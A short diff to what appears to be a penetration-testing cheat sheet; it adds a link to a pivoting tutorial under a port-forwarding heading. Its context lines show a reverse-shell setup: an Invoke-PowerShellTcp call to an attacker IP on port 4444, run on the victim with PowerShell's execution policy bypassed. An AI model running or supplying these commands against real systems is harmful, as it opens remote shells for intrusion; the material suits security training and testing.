@@ -820,6 +820,9 @@ echo "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444" >> In
 powershell -executionpolicy bypass -file Invoke-PowerShellTcp.ps1 #Once on victim run this
 ````
 ## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
+````
+https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/pivoting-basics/
+````
 ### Tools
 #### sshuttle
 ##### Linux Enviorment
